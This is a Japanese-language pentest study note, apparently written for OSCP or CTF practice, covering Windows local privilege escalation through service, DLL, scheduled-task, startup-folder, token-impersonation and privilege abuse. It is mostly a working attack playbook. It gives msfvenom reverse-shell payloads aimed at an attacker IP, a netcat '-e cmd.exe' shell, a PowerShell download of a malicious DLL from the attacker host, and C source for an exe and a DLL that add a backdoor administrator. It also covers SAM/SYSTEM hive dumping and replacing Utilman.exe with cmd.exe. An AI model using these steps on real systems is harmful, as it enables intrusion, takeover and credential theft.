
- 関連ノート：
	- [🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md)
	- [PrivEsc前提知識：Windowsの特権とAccess Controlの仕組み](Windowsの基礎・前提知識/PrivEsc前提知識：Windowsの特権とAccess%20Controlの仕組み.md)

> [!NOTE]
> 特権昇格した後も**再度列挙**し、重要な情報がないかどうかを探索する。
> また、Mimikatzでクレデンシャルをダンプする。

---

# Serviceを利用したPrivEsc

サービスについて：[サービス](../../Misc/用語.md#サービス)

## Service Exploits - Service Binary Hijacking

サービスバイナリを直接上書き可能な場合に使用する手法。
たとえば、winPEASの結果、`Services Information`で`File Permissions: Everyone [Allow: AllAccess]`となっているような場合に使う。

1. [サービスの列挙](🔍Windows%20Local%20Enumeration.md#サービスの列挙)で、StartNameが"LocalSystem"であるサービスを探す
> [!TIP]
> - Stateが"Stopped"のサービスをスタートするには、一般的には高権限が必要なため、権限昇格ベクターとしての優先度は低い
> - どのサービスバイナリを書き換えればいいのかわからない場合は、[Service Binary Hijacking w/ PowerUp（自動）](#Service%20Binary%20Hijacking%20w/%20PowerUp（自動）)で列挙することも検討する
> 

2. 実行バイナリのパーミッションが(F)もしくは(M)であることを確認（[ACL](../Common/権限関連の知識、コマンド.md#ACL)）
```powershell
icacls '<binary_path>'
```

3. [バイナリのペイロード](#バイナリのペイロード)を用意し、本来の実行バイナリのbkupはとった上で上書き
```powershell
mv "<binary_path>" <binary.exe.bkup>
mv <path_to_payload> "<binary_path>"
```
- mvは既存のファイルを直接上書きできないので、書き換え対象のファイルは他のディレクトリに移動させる必要がある

4. サービスを再起動する
```powershelll
net stop <service_name>
net start <service_name>
```
- [💡Tip:サービスの開始、終了に失敗したとき](#💡Tip%20サービスの開始、終了に失敗したとき)

### Service Binary Hijacking w/ PowerUp（自動）

#### PowerUpの準備

1. 攻撃者のマシンから、以下のファイルをターゲットマシンに転送する
```
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
```

2. ターゲット上でPowerUpをimportする
```powershell
powershell -ep bypass
Import-Module .\PowerUp.ps1
```

#### バイナリが書換え可能なサービスの自動列挙

- バイナリが書換え可能なサービス一覧を自動で列挙する（誤検出あり）
```powershell
Get-ModifiableServiceFile
```

↓バイナリが書換え可能なサービスの自動列挙出力

| 出力                              | 意味                                                                                     | 備考                                                    |
| ------------------------------- | -------------------------------------------------------------------------------------- | ----------------------------------------------------- |
| ServiceName                     | サービスバイナリを編集(M)できるサービス名                                                                 | -                                                     |
| ModifiableFile                  | 編集可能なサービスバイナリのパス                                                                       | -                                                     |
| ModifiableFileIdentityReference | サービスバイナリを編集可能なプリンシパル(ユーザー、グループ)                                                        | 自身のグループが表示されているかどうか確認                                 |
| StartName                       | サービスを動作させるプリンシパル                                                                       | *LocalSystem*＝権限昇格の可能性有                               |
| *AbuseFunction*                 | 出力されたコマンドを実行すれば、`john:Password123!`というユーザーを作成し、local administratorsグループに追加し、サービスを再起動する | 🚨うまくいかない時がある。その場合は手動で実行する。                           |
| CanRestart                      | netでサービスを再起動できるかどうか                                                                    | [💡Tip:サービスの開始、終了に失敗したとき](#💡Tip%20サービスの開始、終了に失敗したとき) |

---

## Service Exploits - DLL Hijacking

- DLL Hijackingにあたって必要な基本的な理解：[DLLとは](Windowsの基礎・前提知識/Windows%20Internal.md#DLLとは)

1. インストール済みアプリケーションもしくはサービスで、DLL Hijackingに脆弱なアプリケーションを探す
	- アプリケーションの列挙：[インストール済みアプリケーションの列挙](🔍Windows%20Local%20Enumeration.md#インストール済みアプリケーションの列挙)
	- 公開エクスプロイトの探索：[SearchSploit](../Common/公開エクスプロイトの探索.md#SearchSploit)
	- サービスの列挙：[サービスの列挙](🔍Windows%20Local%20Enumeration.md#サービスの列挙)

2. [Safe DLL Search Mode の探索順序](Windowsの基礎・前提知識/Windows%20Internal.md#Safe%20DLL%20Search%20Mode%20の探索順序)に従って、書込み可能(W) or (M)なディレクトリを明らかにする
```powershell
icacls '<directory_path>'
```

3. [🪟Windows](../Common/権限関連の知識、コマンド.md#🪟Windows)に記載の通り、icaclsで書込み可能であっても実際には書込みできないケースもあるので、テストファイルを作成して実際に書き込めるかどうかを検証する
	- （例）FileZilaのアプリケーションの実行ディレクトリに書込み可能かどうかの検証（実行ファイルのパスが`C:\FileZilla\FileZilla FTP Client\filezilla.exe`の場合）
```powershell
echo 'test' > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

4. 対象のバイナリをローカルにインストールしたうえ(※)で、管理者権限でProcess Monitorを実行し、フィルターを設定する([Process Monitor](../../Tools/🛠️Windows%20Sysintarnals.md#Process%20Monitor))
	- ⏳フィルターの条件：
		- Process Name is `<アプリケーション.exe>` then Include
		- Operation is CreateFile(※) then Include
		- Result is NAME NOT FOUND then include

5. 対象のバイナリを実行し、どのDLLが"NAME NOT FOUND"となっているかを確認する
```powershell
# サービスの作成
New-Service -Name "<service_name>" -BinaryPathName "<path_to_binary>" -DisplayName "<任意文字列>" -StartupType Manual
# サービスの既読
sc.exe query "<service_name>"
sc.exe start "<service_name>"
```
- →[Safe DLL Search Mode の探索順序](Windowsの基礎・前提知識/Windows%20Internal.md#Safe%20DLL%20Search%20Mode%20の探索順序)を念頭に当該レコードが先にロードされることを確かめる

![](../../Images/Pasted%20image%2020250816122522.png)

$$Result列がNot　Foundとなっている例$$

> [!WARNING]
> 単純にバイナリをダウンロードして実行しても書き換え対象のDLLが正しく表示されないので、サービスとして実行すること。

7. ペイロードを用意する（[Malicious DLL](#Malicious%20DLL)）

8. ターゲットマシンに戻り、"NAME NOT FOUND"となっているパスのDLLを用意したペイロードで上書きする
```powershell
Invoke-WebRequest -Uri 'http://<attacker_IP>:<port>/<payload.dll>' -OutFile '<NAME_NOT_FOUNDのPath>'
```

8. サービスが再起動されるのを待つか、手動でサービスを再起動する
	- サービスは[sc.exeによる再起動](#sc.exeによる再起動)で再起動

---

## Service Exploits - Unquoted Service Path

### Unquoted Service Pathに関する前提事項

サービスのメインディレクトリやサブディレクトリへの書き込みパーミッションはあるが、その中のファイルを置き換えることができない場合に、この攻撃を使うことを検討する。

サービスは、サービス起動時に実行される実行可能ファイルを紐づけている。

しかし、実行ファイルパスがクオテーションで囲まれていないと、スペースに達するたびに`.exe`を追加しファイル名として解釈しようとする（本来意図された実行可能ファイルは`service.exe`）。
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
$$サービスによる実行可能ファイルパス解釈順序の例$$

攻撃の概要：
1. ペイロードを用意
2. ファイルパスの解釈順序を利用して、本来意図されていた実行可能ファイルよりも前に解釈されるファイルを配置
3. サービスが実行されると、サービスの<u>StartName（サービスを開始するユーザー）の権限で悪意ある実行可能ファイルが実行される</u>

### Unquoted Service Pathのエクスプロイト方法

1. [🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#サービスの列挙)で、以下の条件のサービスを探す
	- StartNameがLocalSystem
	- サービスバイナリに空白がある
	- サービスバイナリがクオテーションで囲まれていない

2. 実行可能ファイルパス解釈順序を参考に、書込み可能 (W) or (M)なディレクトリを探す（[Unquoted Service Pathに関する前提事項](#Unquoted%20Service%20Pathに関する前提事項)）
```powershell
icacls '<dir_path>'
# 具体例
icacls 'C:\'
icacls 'C:\Program Files'
icacls 'C:\Program Files\My Program'
...
```

3. [🪟Windows](../Common/権限関連の知識、コマンド.md#🪟Windows)に記載の通り、icaclsで書込み可能であっても実際には書込みできないケースもあるので、害のないファイルを作成して実際に書き込めるかどうかを検証する
```powershell
echo 'test' > '<writable_dir>\test.txt'
type '<writable_dir>\test.txt'
```

4. [バイナリのペイロード](#バイナリのペイロード)を用意し、本来意図されていた実行ファイルよりも前に解釈されるファイル名に名前を変更し、書込み可能なディレクトリに配置する
```powershell
# 具体例: cp My.exe 'C:\Program Files\My.exe'
cp <path_to_payload> '<writable_dir\payload>'
```

5. サービスを再起動する
```cmd
net stop <service_name>
net start <service_namw>
```
- [💡Tip:サービスの開始、終了に失敗したとき](#💡Tip%20サービスの開始、終了に失敗したとき)

### Unquoted Service Path w/ PowerUp

- [PowerUpの準備](#PowerUpの準備)

1. 脆弱なサービスの列挙
```powershell
Get-UnquotedService
```

2. 実行可能ファイルパス解釈順序を参考に、書込み可能（W）なディレクトリを探す
```powershell
icacls '<dir_path>'
```

3. ステップ１の"AbuseFunction"の実行
```powershell
Write-ServiceBinary -Name '<service_name>' -Path '<writable_dir\payload>'
```

---

## Service Exploits - Insecure Service Permissions

サービスバイナリを上書きするのではなく、設定を変更して、攻撃者の用意したペイロードをサービスバイナリとする。

1. [サービスの列挙](🔍Windows%20Local%20Enumeration.md#サービスの列挙)で、"SERVICE_START_NAME" : LocalSystemであるサービスを列挙する

2. Sysinternalの🔗[AccessChk](https://learn.microsoft.com/ja-jp/sysinternals/downloads/accesschk)をインストールする

3. 現在のユーザーのサービスに対するパーミッションをチェックする
```cmd
.\accesschk.exe /accepteula -uwcqv %username% <service_name>
```
- "SERVICE_CHANGE_CONFIG"または"SERVICE_ALL_ACCESS"を確認
![ 400](../../Images/Pasted%20image%2020230503155428.png)

3. サービスの実行バイナリをリバースシェルペイロードに設定する
```cmd
sc config <service> binpath= "\"<path to payload>\"" obj= LocalSystem
```

4. Everyoneに対してバイナリファイルへのフルアクセス権限を与える
```cmd
icacls <path_to_payload> /grant Everyone:F
```

5. サービスを再起動する
```cmd
net stop <service_name>
net start <servic_namee>
```
- [💡Tip:サービスの開始、終了に失敗したとき](#💡Tip%20サービスの開始、終了に失敗したとき)

---

## Service Exploits - Weak Registry Permissions

1. [サービスの列挙](🔍Windows%20Local%20Enumeration.md#サービスの列挙)で、"SERVICE_START_NAME" : LocalSystemであるサービスを列挙する

2. Sysinternalの🔗[AccessChk](https://learn.microsoft.com/ja-jp/sysinternals/downloads/accesschk)をインストールする

3. レジストリエントリのパーミッションを確認
```cmd
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service_name>
```

4. ImagePathをペイロードに書き換える
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d <path_to_payload> /f
```

![](../../Images/Pasted%20image%2020230625110543.png)


5. サービスを再起動する
```cmd
net stop <service_name>
net start <service_name>
```
- [💡Tip:サービスの開始、終了に失敗したとき](#💡Tip%20サービスの開始、終了に失敗したとき)

---

## 💡Tip:サービスの開始、終了に失敗したとき

- CouldNotStartService等、サービスが開始できないと表示された場合:
	- →ペイロードが実行されていることを確認する（用意したペイロードがサービスとしては使えないだけな場合がある）

- permission deneidで`net start|stop <service>`ができない場合：
	- →以下の方法を使う

### システム再起動 x Autoスタート

1. StartModeがAutoかどうかを確認する
	- 起動時にサービスが自動で動作する
```powershell
# cmd.exeの場合：sc qc <service>でSTART_TYPEを確認
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service>'}
```
	↓
```
Name  StartMode
----  ---------
<service> Auto
```

2. 現在のユーザーの再起動の権限を確認する
```cmd
whoami /priv
```
	↓
```
Privilege Name      Description             State
==============      =====================  ========
SeShutdownPrivilege  Shut down the system  Disabled
```
- →StateがDisabled＝実行中のプロセスがこの権限を利用していないだけで、権限は有効

3. 再起動することで、自動でサービスの状態がリセットされる
```cmd
shutdown /r /t 0
```
- `/r`：シャットダウンではなく再起動する

### sc.exeによる再起動

scの使用
```powershell
# cmdの場合はsc stop..(.exe不要)
# Runningの場合
sc.exe stop <service>
# 状態確認
sc.exe query <service>
# 起動
sc.exe start <service>
```
- 再起動ができなくなった場合はサービスが壊れているため、切戻したうえで異なる手法で権限昇格する

---
---

# Scheduled Tasksを利用したPrivEsc

1. [スケジュールタスクの列挙](🔍Windows%20Local%20Enumeration.md#スケジュールタスクの列挙)で、PrivEscに繋げられるタスクを列挙する

2. Task To Runの実行バイナリをペイロードで上書きするため、パーミッションが(F)もしくは(M)であることを確認
```powershell
icacls <Task_to_Run>
```

3. [バイナリのペイロード](#バイナリのペイロード)を用意し、本来の実行バイナリのbkupはとった上で上書き
```powershell
mv '<binary_path>' <binary.exe.bkup>
mv <path_to_payload> '<binary_path>'
```
- mvは既存のファイルを直接上書きできないので、書き換え対象のファイルは他のディレクトリに移動させる必要がある

4. タスクが実行されるのを待つ
	- 手動で実行できる場合は以下のコマンドで実行可能
```cmd
schtasks /run /tn <Task_Name>
```

---
---

# Startup Appsを利用したPrivEsc

- StartUp Appsとは、ユーザーログイン時に自動実行されるアプリケーションのこと
- 個別ユーザー用と全ユーザー用がある
- 管理者の設定ミスで、通常は書き込めないはずの全ユーザー用のStartUpディレクトリが書き込み可能であると、悪意あるペイロードがログインしたユーザーの権限で実行される
- ❌高権限ユーザーがログインするのを待つ必要がある

1. StartUpディレクトリのパーミッションが(F) or (M) or (W)であることを確認する
```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

2. 攻撃者のマシン上で[バイナリのペイロード](#バイナリのペイロード)によってexeファイルのペイロードを用意し、ターゲットマシンに転送する

3. ターゲットマシン上でStartUpディレクトリにペイロードを配置する
```cmd
copy "<path_to_payload>" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

4. リスナーを立てた上でターゲットの高権限ユーザーがログインするのを待つ

---
---

# エクスプロイトの使用によるPrivEsc

３つある：
1. アプリケーションの脆弱性
	- → [公開エクスプロイトの探索](../Common/公開エクスプロイトの探索.md)

2. Windows Kernelの脆弱性
	- →[公開エクスプロイトの探索](../Common/公開エクスプロイトの探索.md)

>[!WARNING]
>- 🚨Kernel Exploitは簡単にシステムをクラッシュさせてしまう恐れがあるため、信頼できるソース（Exploit-DBのVerified）からダウンロードし、ターゲット環境を模した検証環境で試してからターゲット環境に使用すること
>- ソースコードが閲覧できる場合にのみ使用すること（バイナリによって悪意あることがされないことを確認）

3. 特定のWindows特権の悪用
	- →[Windows特権のエクスプロイト](#Windows特権のエクスプロイト)

## Windows特権のエクスプロイト

- 参考🔗：[Priv2Admin](https://github.com/gtworek/Priv2Admin)

![](../../Images/Pasted%20image%2020250820172631.png)

$$Priv2Adminの中身は権限ごとにPrivEsc技法概要がまとめられている$$

### SeImpersonatePrivilege / SeAssignPrimaryToken

#### SeImpersonatePrivilege / SeAssignPrimaryTokenについて基本事項

- 他のユーザーのセキュリティコンテキスト（権限）で操作できる権限
- 本来の用途は、サービスやサーバーアプリが接続してきたクライアントの権限で処理を行うこと（接続してきたクライアントが低権限なのにサーバーの高権限で処理をするとセキュリティ上危険）

- <u>以下のプリンシパルにこの権限が割り当てられることが多いため、このプリンシパルで足場を獲得したら狙い目</u>：
	- Local Service
	- Network Service
	- Application Pool Identity（`iis apppool\defaultapppool`）

#### Token Impersonationによる権限昇格

1. 攻撃者マシンにGithubから使用するツール(SigmaPotato等)をダウンロードし、ターゲットマシンに転送する
2. 攻撃者マシンで[バイナリのペイロード](#バイナリのペイロード)を用意し、ターゲットマシンに転送する
3. ⇩ペイロードを実行する：

##### 🔗[SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)

- 対象OS：Windows Server 2012 - 2022 / Windows 8 - 11（==ほぼすべてのOS==で動作）
- 条件：Print Spoolerが動作している
	- `cmd /c sc query Spooler`の結果、STATEが`Running`となっている
	- `STOPPED`の場合でも、`cmd /c sc start Spooler`を試行する
- 🚨PrintSppolerサービスが停止している場合、<u>Potatoシリーズは使えない</u>か、使えても非常に不安定
- SigmaPotatoは🔗[GodPotato](https://github.com/BeichenDream/GodPotato)の改良版で、25年8月時点でPotatoシリーズの頂点(SigmaPotatoが動かないときは、GodPotatoやPrintSpooferの使用を考慮)
```powershell
# ペイロード使用なし（動作しない可能性有り）
.\SigmaPotato.exe --revshell <attacker_IP> <port>
```
```powershell
# ペイロード使用あり（動作しない可能性あり）
.\SigmaPotato.exe "<path_to_payload>"
```
```powershell
# 上述した２つの方法よりは安定
.\SigmaPotato.exe "nc.exe <attacker_IP> <port> -e cmd.exe"
```
```powershell
# 任意のユーザーを作成し、Administratorsグループに追加する（💡最も安定）
.\SigmaPotato.exe "net user <username> <password> /add"
.\SigmaPotato.exe "net localgroup Administrators <username> /add"
```
- →作成したユーザーでRDP接続し、cmdを「管理者として実行」(Run as administrator)すればOK

##### 🔗[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

- 対象OS：Windows 10 / Windows Server 2016 - 2019
- SigmaPotatoと比較して動作することが少ないが、**安定**している
- 条件：Print Spoolerが動作している（確認方法：`sc query Spooler`）
```powershell
.\PrintSpoofer64.exe -i -c "<path_to_payload>" 
```

##### 🔗[JuicyPotato](https://github.com/ohpe/juicy-potato)

- 対象OS：Windows 7 / Windows Server 2008（==古いOS==で動作）
- 条件：Print Spoolerが動作している（確認方法：`sc query Spooler`）
```powershell
.\JuicyPotato.exe -t * -p "<path_to_payload>" -l <任意のリッスンポート番号> -c {<CLSID値>}
```
- CLSIDは[GetCLSID script](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)をターゲット環境で実行して入手する必要がある

##### 🔗[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)

- 条件：
	- WinRM(port: 5985)がストップしていること（確認方法：`sc query WinRM`）
	- BITSサービスが実行中であること（確認方法：`sc query BITS`）
```powershell
.\RogueWinRM.exe -p "<path to payload>"
```

---

### SeBackupPrivilege

#### SeBackupPrivilegeについて基本事項

- 高権限でREADが可能な権限で、SAM・SYSTEMレジストリハイブからAdministratorの認証情報を窃取できる
- 本来の用途は、バックアップソフトウェアや復元ソフトウェアがシステム内のあらゆるファイルを処理できるようにすること
- 以下のプリンシパルにこの権限が割り当てられることが多い
	- Backup Operator：組込みグループ
	- Backup xxx：バックアップ処理を実施するプリンシパル or 所属グループ
	- Helpdesk

>[!INFO] 補足：SAMハイブ・SYSTEMハイブについて
>- Windows のレジストリは複数の「ハイブ（Hive）」と呼ばれるデータベースファイルで構成されていて、SAMとSYSTEMはそのハイブの１つ
>- 直接`C:\Windows\System32`配下にあるSAMとSYSTEMを攻撃者のマシンに持って来れる場合は、それだけでハッシュダンプできる
>- [SAM（Security Account Manager）](../../Misc/用語.md#SAM（Security%20Account%20Manager）)、[SYSTEM](../../Misc/用語.md#SYSTEM)

#### SAM・SYSTEMハイブ悪用による権限昇格

1. ターゲット上でSAM・SYSTEMハイブをバックアップする
```cmd
reg save hklm\system C:\Users\<username>\system.hive
reg save hklm\sam C:\Users\<username>\sam.hive
```

2. 取得したバックアップを攻撃者のマシンに転送し、攻撃者のマシンでSAM・SYSTEMハイブのバックアップから認証情報をダンプする
```zsh
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

3. ダンプしたHashをハッシュクラックやPtHにつなげる
	- →[Password Attack](../Common/Password%20Attack.md)

---

### SeTakeOwnershipPrivilege

#### SeTakeOwnershipPrivilegeについて基本事項

- ファイルやレジストリキーなど、システム上のあらゆるオブジェクトの所有権（Ownership）を取得できる権限
    - → 攻撃者が所有権を取得することで、特権昇格が可能になる

- 本来の用途は、管理者がアクセス権のないファイルやレジストリの所有権を取得して管理するため

##### 補足：utilman.exeの悪用

- Windows には Utilman.exe（「簡単操作」ボタンを起動するユーティリティ）がある
- このファイルは <u>SYSTEM 権限</u>で実行される
	- → 所有権を取得して好きなペイロード（例：cmd.exe）に置き換えると、  SYSTEM 権限でコマンドを実行できる

![](../../Images/Pasted%20image%2020250820173951.png)

$$utilmanの場所を明示した画像$$

#### SeTakeOwnershipPrivilege悪用による権限昇格

参考🔗：[SeTakeOwnership - HackFast](https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeTakeOwnershipPrivilege/#exploiting-with-utilman)

>[!NOTE]
>- 以下の方法による権限昇格にはGUIアクセスが必要
>- GUIアクセスがないときは、下に説明するステップ１、２の方法で任意のサービス・バイナリの所有権を取得し、[Service Exploits - Service Binary Hijacking](#Service%20Exploits%20-%20Service%20Binary%20Hijacking)を実施する
>- 以下ステップ１、２によって、あらゆる情報が閲覧可能になる

1. ターゲット上でutilman.exe の所有権を取得
```powershell
takeown /f C:\Windows\System32\Utilman.exe
```
- →所有者になれば、必要な権限を自分に割り当てることが可能

2. utilman.exe に対して全権限を自身（ターゲットマシン上の現在のユーザー）に付与
```powershell
icacls C:\Windows\System32\Utilman.exe /grant <username>:F
```


3. utilman.exe を cmd.exe のコピーに置き換え
```powershell
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

4. 画面をロックし、Ease of Access ボタン（🕰️マーク）を押す

![ 150](../../Images/Pasted%20image%2020230504114834.png)

	↓

![ 300](../../Images/Pasted%20image%2020250820173951.png)

5. SYSTEM 権限でコマンドプロンプトが表示される

---
---

# 使用するペイロードの用意

攻撃者のマシン上で実施

## バイナリのペイロード

### reverse shell用バイナリペイロード生成

- サービスの場合
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f exe-service -o <output.exe>
```

- 通常の実行ファイル（Scheduled Task等）の場合
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f exe -o <output.exe>
```

### ユーザー追加用バイナリペイロード w/ C言語

1. スクリプトの用意
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user <username> <password> /add");
  i = system ("net localgroup administrators <username> /add");
  
  return 0;
}
```

2. クロスコンパイル
```zsh
x86_64-w64-mingw32-gcc <name>.c -o <name>.exe
```
- 参考：[コンパイル・ビルド](../../Misc/コンパイル・ビルド.md)

## Malicious DLL

Malicious DLLは上書き対象のDLLと同じ名前で作成すること。

### reverse shell用DLLペイロード作成

```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f dll -o <output.dll>
```

### ユーザー追加用DLLペイロード w/ C言語


 DLL_PROCESS_ATTACHやDETACHなど、DLLをロードまたはアンロードする🔗[標準的なコード](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#the-dll-entry-point)をアレンジしたもの。

1. スクリプトの用意
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

2. クロスコンパイル
```zsh
x86_64-w64-mingw32-gcc <name>.cpp --shared -o <name>.dll
```
- 参考：[コンパイル・ビルド](../../Misc/コンパイル・ビルド.md)

---
---

# Misc

## 参考：高権限で実行されるGUIアプリケーション(CTF like)

- 業務用のレガシーアプリなど、ターゲットが独自に使用しているアプリが高権限で実行されている可能性がある
	- 通常のWindowsでは、UACによって管理者権限でアプリは実行されないが、古く、セキュリティ意識の低いターゲットであればあり得る攻撃ベクター
- その場合、アプリケーションの"File"タブからcmd.exeを実行すれば、簡単にシェルが取れる

1. Desktop上のショートカットやアプリを探索し、ダブルクリックして開く

2. 実行中のタスクを列挙し、管理者権限で実行されているアプリを発見する
```cmd
tasklist /V
```

3. アプリケーションのFileタブ -> Open -> 上部ナビゲーションに`file://c:/windows/system32/cmd.exe`と入力

---

## 参考：AlwaysInstallElevatedメソッド(CTF like)

- Windowsインストーラーファイル（別名.msiファイル）が常に高権限で実行される場合に使える
- ⚠️現実にはほぼあり得ない

1. ターゲット上で以下２つのレジストリキーに値が設定されていることを確認する
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
- →どちらのレジストリも"AlwaysInstallElevated    REG_DWORD    0x1"となっていると有効

2. 攻撃者マシン上でmsiのペイロードを生成する
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f msi -o <output.msi>
```

3. ターゲットにステップ２で作成したペイロードを転送

4. ターゲット上でペイロードを実行する
```cmd
msiexec /quiet /qn /i <output.msi>
```
- `/qn`: `quiet`とほぼ同じで画面に何も表示せず実行するが、何かあったときはログファイルに記録する
- `/i`: インストールモードを指定

---
---

# 🔗参考リンク

-   [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-   [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
-   [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
